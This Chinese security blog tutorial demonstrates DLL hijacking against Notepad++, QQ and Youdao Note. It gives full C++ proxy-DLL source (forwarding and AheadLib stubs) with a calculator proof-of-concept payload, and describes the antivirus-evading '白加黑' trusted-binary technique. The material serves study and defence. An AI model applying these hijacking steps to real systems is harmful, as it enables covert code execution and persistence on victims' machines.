## 基础知识

DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。
在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件。

在windows平台下，很多应用程序的很多功能是相似的，抛去ui等等来说，大致的功能都差不多，比如都得调用窗口，都得调用内存管理的模块来分配内存，都得调用io模块去进行文件操作，读写文件等等，这些模块的具体表现就是DLL文件。

Windows操作系统通过“DLL路径搜索目录顺序”和“Know
DLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。

 **DLL路径搜索目录顺序**

1.程序所在目录；

2.程序加载目录（SetCurrentDirectory）；

3.系统目录即 SYSTEM32 目录；

4.16位系统目录即 SYSTEM 目录；

5.Windows目录；

6.PATH环境变量中列出的目录。

 **Know DLLs注册表项**

Know DLLs注册表项里的DLL列表在应用程序运行后就已经加入到了内核空间中，多个进程公用这些模块，必须具有非常高的权限才能修改。

Know DLLs注册表项的路径为`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session
Manager\KnownDLLs`。

# 手动劫持

### 劫持应用中没有的dll

这里dll劫持的选用的是notepad++，注意版本问题，我第一次进行dll劫持的时候使用的是最新版本，导致我鼓捣半天都没能正确执行，搞得我一脸懵逼，百度之后才发现notepad后面的版本修复了漏洞，所以这里选的是6.6.6的版本。

![image-20211002164117391.png](https://image.3001.net/images/20220317/1647503383_6232e817a61fec30bdabe.png!small)

使用到Procmon.exe程序。

![image-20211002164253393.png](https://image.3001.net/images/20220317/1647503388_6232e81c6f65ba341e5be.png!small)

这里打开过后设置几个过滤条件，分别是进程名、路径以及结果。

![image-20211002164529087.png](https://image.3001.net/images/20220317/1647503393_6232e821074146fc54156.png!small)

然后这里找一个需要用到`loadlibrary`这个api的dll，这里找有这个api的原因是因为如果该dll的调用栈中存在有
**LoadLibrary(Ex)**
，说明这个DLL是被进程所动态加载的。在这种利用场景下，伪造的DLL文件不需要存在任何导出函数即可被成功加载，即使加载后进程内部出错，也是在DLL被成功加载之后的事情。

![image-20211002164621431.png](https://image.3001.net/images/20220317/1647503399_6232e827f1fd297d7176f.png!small)

`LoadLibrary`和`LoadLibraryEx`一个是本地加载，一个是远程加载，如果DLL不在调用的同一目录下，就可以使用`LoadLibrary(L"DLL绝对路径")`加载。但是如果DLL内部又调用一个DLL，就需要使用`LoadLibraryEx`进行远程加载，语法如下：

    
    
    LoadLibraryEx(“DLL绝对路径”, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
    

`LoadLibraryEx`的最后一个参数设置为`LOAD_WITH_ALTERED_SEARCH_PATH`即可让系统dll搜索顺序从我们设置的目录开始。

![image-20211002165004352.png](https://image.3001.net/images/20220317/1647503408_6232e830814ef9f64c73e.png!small)

这里使用vs2019编译一个dll。

![image-20211002165327811.png](https://image.3001.net/images/20220317/1647503416_6232e83806d527c363493.png!small)

这里使用到`<stdlib.h>`库调用`system()`生成弹出一个计算器即可。

![image-20211002165427446.png](https://image.3001.net/images/20220317/1647503421_6232e83d68a99fa5a85ec.png!small)

编译并复制到Notepad++的根目录下。

![image-20211002165559106.png](https://image.3001.net/images/20220317/1647503428_6232e84430cba02234edf.png!small)

![image-20211002165647237.png](https://image.3001.net/images/20220317/1647503432_6232e84826c722d4d78ee.png!small)

运行即可弹出计算器。

![image-20211002165754717.png](https://image.3001.net/images/20220317/1647503437_6232e84d29b63b911eb25.png!small)

## 劫持应用中存在的dll

这里改个条件，改为SUCCESS。

![image-20211002191805537.png](https://image.3001.net/images/20220317/1647503441_6232e851948c498fcf74d.png!small)

双击SciLexer.dll
然后看下stack，可以发现同样存在loadlibrary。那就说明这个dll是动态加载的，并且不需要什么导出函数就可以成功被加载。并且是在程序在运行过程中完成的。

![image-20211002191903464.png](https://image.3001.net/images/20220317/1647503447_6232e8574a506023fa09c.png!small)

这时候我们就需要找这个dll的导出函数，导出函数是可以被外部访问的。导出表包含 DLL 导出到其他可执行文件的每个函数的名称，这些函数是 DLL
中的入口点；只有导出表中的导出函数可由其他可执行文件访问。DLL 中的任何其他函数都是 DLL 私有的。

在动态调用的时候，一般代码通过loadlibrary去加载dll 并作为参数传到到导出函数，这里看一下导入表，发现他这里有一个导出函数。

![image-20211002192257020.png](https://image.3001.net/images/20220317/1647503453_6232e85d2fec5a1fd4ff8.png!small)

编写dll时，有个重要的问题需要解决，那就是函数重命名——Name-Mangling。C++的编译器通常会对函数名和变量名进行改编，这在链接的时候会出现一个严重的问题，假如dll是C++写的，可执行文件是C写的。在构建dll的时候，编译器会对函数名进行改编，但是在构建可执行文件的时候，编译器不会对函数名进行改。这个时候当链接器试图链接可执行文件的时候，会发现可执行文件引用了一个不存在的符号并报错，这里我就直接定义`extern
"C"`来告诉编译器不对变量名和函数名进行改编即可。

代码如下，我们的目的就是让程序本身去`LoadLibrary`去加载dll：

    
    
    // dllmain.cpp : 定义 DLL 应用程序的入口点。
    #include "pch.h"
    #include <stdlib.h>
    
    extern "C" __declspec(dllexport) void Scintilla_DirectFunction();
    
    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
    
    void Scintilla_DirectFunction()
    {
        system("calc.exe");
    }
    

生成dll并改名为`SciLexer.dll`，把原来的dll先放到桌面保存。

![image-20211002193027544.png](https://image.3001.net/images/20220317/1647503532_6232e8ac22b11f2f10b04.png!small)

然后运行一下发现报错了。

![image-20211002193229727.png](https://image.3001.net/images/20220317/1647503538_6232e8b2353bd9f64aa79.png!small)

这里也没有弹出计算器，这里就卡了很久，然后发现这里还可以用一种dll转发的方式。

dll转发顾名思义，就是要保留原来的dll，再生成一个恶意的dll执行代码，代码如下：

    
    
    // dllmain.cpp : 定义 DLL 应用程序的入口点。
    # include "pch.h"
    # include <stdlib.h>
    
    extern "C" __declspec(dllexport) void Scintilla_DirectFunction();
    
    BOOL APIENTRY DllMain(HMODULE hModule,
        DWORD  ul_reason_for_call,
        LPVOID lpReserved
    )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
            system("calc");
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
    
    void Scintilla_DirectFunction()
    {
        HINSTANCE hDll = LoadLibrary(L"SciLexer_re.dll");
        if (hDll)
    
        {
            //typedef 是定义了一个新的类型
            //DWORD是双字类型 4个字节,API函数中有很多参数和返回值是DWORD
            //定义了类型EXPFUNC，并且返回类型是DWORD的函数的指针
            typedef DWORD(WINAPI* EXPFUNC)();
            EXPFUNC expFunc = NULL;
            expFunc = (EXPFUNC)GetProcAddress(hDll, "Scintilla_DirectFunction");
            if (expFunc)
            {
                expFunc();
            }
    
        }
        return;
    }
    

然后把原dll改名为``SciLexer_re.dll`，并将生成的恶意dll改名为`SciLexer.dll。`

![image-20211002193654929.png](https://image.3001.net/images/20220317/1647503545_6232e8b9a0e420218fb5d.png!small)

运行notepad++即可。

![image-20211002195127259.png](https://image.3001.net/images/20220317/1647503551_6232e8bf56a9723088760.png!small)

转发对主程序的依赖非常的高，报错是CreateWindowsEx()返回值为空报错，当使用转发，让程序先走恶意的dll（SciLexer.dll），再走正常的dll的时候（SciLexer_re.dll），我们不清楚主程序的需求是什么可能是一个返回值，也可能参数不正确，这个时候都会导致主程序运行出错。

# 使用工具劫持

### 直接转发

这里还是使用导入表进行劫持，首先用cff(下载地址:https://ntcore.com/files/CFF_Explorer.zip)打开QQ.exe的导入表，找一个不在`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session
Manager\KnownDLLs`路径里面的dll进行劫持，因为在这个路径里面的dll是优先加载的，加载之后已经进入内核空间，想要劫持难度很大。这里我选择的是`libuv.dll`进行劫持。

![image-20211002223720457.png](https://image.3001.net/images/20220317/1647503558_6232e8c65d67828cdf181.png!small)

找到路径下的`libuv.dll。`

![image-20211002223811673.png](https://image.3001.net/images/20220317/1647503566_6232e8ce5874cfdbabec1.png!small)

然后使用到aheadlib这个工具，输入dll就填QQ.exe路径下的`libuv.dll`，输出CPP会自动生成，原始DLL的名称要记住，等下会替换。

![image-20211002224010402.png](https://image.3001.net/images/20220317/1647503573_6232e8d5a5e06674e55a5.png!small)

点击生成就会在目录下生成一个.cpp文件。

![image-20211002224056530.png](https://image.3001.net/images/20220317/1647503578_6232e8dabf1bee8e05c77.png!small)

打开看一下有一个入口函数。

![image-20211002224113213.png](https://image.3001.net/images/20220317/1647503584_6232e8e0ac58092b15c05.png!small)

新建一个vs dll项目，然后将.cpp的代码复制进去，并加上`<windows.h>`和`<stdlib.h>`头文件。

![image-20211002224416837.png](https://image.3001.net/images/20220317/1647503590_6232e8e600b7a4226cad8.png!small)

然后在入口函数的地方填上一个弹出计算器的语句。

![image-20211002225237769.png](https://image.3001.net/images/20220317/1647503597_6232e8ed580ba4d496cbf.png!small)

将原dll文件改名为之前在软件里面复制的名字`libuvOrg.dll`，并把我们生成的dll文件复制进去。

![image-20211002224614729.png](https://image.3001.net/images/20220317/1647503608_6232e8f8c56770915962c.png!small)

点击QQ.exe即可弹出calc.exe。

![image-20211002224703600.png](https://image.3001.net/images/20220317/1647503619_6232e903a3bf1412366b6.png!small)

这里分析一下导出函数的代码，随便选一行。

![image-20211002225530113.png](https://image.3001.net/images/20220317/1647503626_6232e90a9029883152d44.png!small)

当程序想要调用程序中的`uv_udp_open`函数的时候，需要先`LoadLibrary`，即通过`libuvOrg.uv_udp_open,@195`去加载原始dll，那么`libuvOrg.dll`其实已经被转发。

    
    
    #pragma comment(linker, "/EXPORT:uv_udp_open=libuvOrg.uv_udp_open,@195")#pragma comment(linker, "/EXPORT:uv_udp_open=libuvOrg.uv_udp_open,@195")
    

## 即时调用

还是劫持之前的dll：`libuv.dll`，这里还是先输入DLL，然后转发的地方改为即时调用。

![image-20211002225932932.png](https://image.3001.net/images/20220317/1647503634_6232e912c2d53a8534a0f.png!small)

生成一个vs dll项目，把生成的libuv.cpp代码copy到项目里面，然后加上`#include "pch.h"`和`#include
<stdlib.h>`。

![image-20211002230205529.png](https://image.3001.net/images/20220317/1647503640_6232e91818fe3cd3beee3.png!small)

在入口函数的地方添加上我们的恶意代码。

![image-20211002230216710.png](https://image.3001.net/images/20220317/1647503645_6232e91dd9c9654623a42.png!small)

然后把原dll改名为`libuvOrg.dll`，再把我们编译生成的dll粘贴进去。

![image-20211002230318118.png](https://image.3001.net/images/20220317/1647503650_6232e922a60bfe50ce1a4.png!small)

点击QQ.exe即可完成劫持。

![image-20211002230341279.png](https://image.3001.net/images/20220317/1647503655_6232e927cdae7e8bc31cf.png!small)

这里继续看看代码，调用导出函数之前先执行入口函数，函数执行完成过后return到Load函数，这里跟过去看看。

![image-20211002230640279.png](https://image.3001.net/images/20220317/1647503662_6232e92ea8d34d729283e.png!small)

Load函数首先把`libuvOrg.dll`即原来的dll文件写入缓冲区，使用`LoadLibrary`展开后通过`wsprintf`与原dll进行判断，如果`LoadLibrary`成功则继续调用`InitializeAddresses()`函数，继续跟过去看看。

![image-20211002230749517.png](https://image.3001.net/images/20220317/1647503668_6232e9344aaf5a3f56fbd.png!small)

这里可以发现`InitializeAddresses`这个函数的作用都是调用`GetAddress`去Load函数的地址。

![image-20211002230936488.png](https://image.3001.net/images/20220317/1647503673_6232e9391289174f5cb26.png!small)

![image-20211002231043601.png](https://image.3001.net/images/20220317/1647503679_6232e93fe0314e73ab5d8.png!small)

再看看导出函数。

![image-20211002231122423.png](https://image.3001.net/images/20220317/1647503685_6232e9453596900bc6896.png!small)

程序要调用`uv_async_init`这个函数，就可以直接获取原始dll中`uv_async_init`函数的地址。

    
    
    #pragma comment(linker, "/EXPORT:uv_async_init=_AheadLib_uv_async_init,@2")
    

直接用__asm jmp到原始dll的导出函数地址去完成功能即可。

![image-20211002231313375.png](https://image.3001.net/images/20220317/1647503691_6232e94ba7f52427ad224.png!small)

对比之前用直接转发出来的cpp，对比之前用直接转发出来的cpp，直接转发对主程序来说，其实就是调用了原来dll的某个函数。

但是即时调用实际上是调用了劫持dll的某个函数，只不过那个函数会jmp到原本的dll中的相应函数的地址。达到的效果相同，但是实现的原理不同。

# 白加黑

白加黑，就是一个白exe，加上一个黑代码，这里的黑可以是shellcode，也可以是dll。这里主要是尝试一下之前判断的工具的流程，使用导出函数。

这里找一个不在Know
DLLs里面的dll，而且这个dll必须要用`LoadLibrary`进行加载，这里我找的是`CrashRpt.dll`，可以看到有4个导出函数。

![image-20211003105128024.png](https://image.3001.net/images/20220317/1647503696_6232e950d2ef0de886c83.png!small)

那么这里用vs新建一个dll，把这4个导出函数由我们自己来写，这里尝试不转发即时调用，如果不成功在尝试转发。

![image-20211003105143383.png](https://image.3001.net/images/20220317/1647503701_6232e955dc8088f73f9d5.png!small)

完整代码如下：

    
    
    // dllmain.cpp : 定义 DLL 应用程序的入口点。
    #include "pch.h"
    #include <windows.h>
    #include <stdlib.h>
    
    extern "C" __declspec(dllexport) void RptCleanup();
    extern "C" __declspec(dllexport) void RptSetAdditionalInfo();
    extern "C" __declspec(dllexport) void RptNcThreadListAddCurrent();
    extern "C" __declspec(dllexport) void RptInitializeWithDefaultSettingsWithVersion();
    
    void RptCleanup()
    {
        system("calc");
    }
    
    void RptSetAdditionalInfo()
    {
    
    }
    
    void RptNcThreadListAddCurrent()
    {
    
    }
    
    void RptInitializeWithDefaultSettingsWithVersion()
    {
    
    }
    
    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
    

然后生成dll把原来的`CrashRpt`替换掉。

![image-20211003105154159.png](https://image.3001.net/images/20220317/1647503708_6232e95caf3858e6145c0.png!small)

启动有道云即可成功弹出计算器。

![image-20211003105232401.png](https://image.3001.net/images/20220317/1647503714_6232e9625406f62bac2b1.png!small)

